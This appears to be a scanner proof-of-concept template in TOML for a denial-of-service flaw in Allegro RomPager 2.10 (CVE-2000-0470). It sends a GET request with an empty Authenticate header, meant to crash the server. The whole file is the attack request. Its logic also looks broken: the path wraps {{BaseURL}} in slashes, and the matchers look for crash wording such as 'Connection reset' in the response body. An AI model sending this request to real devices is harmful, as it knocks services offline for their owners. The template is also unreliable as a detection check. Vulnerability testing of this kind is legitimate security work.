[info]
author = "AVE"
description = "向Allegro RomPager 2.10 HTTP服务器发送包含畸形Authenticate头的GET请求，导致服务器进程崩溃拒绝服务"
id = "POC-AVE-2000-0393"
name = "Allegro RomPager 2.10 DoS PoC"
severity = "high"
tags = ["ave-2000-0393"]
vuln_id = [
    "CVE-2000-0470",
    "AVE-2000-0393",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.headers]
Authenticate = ""

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Connection reset",
    "closed",
    "timeout",
]
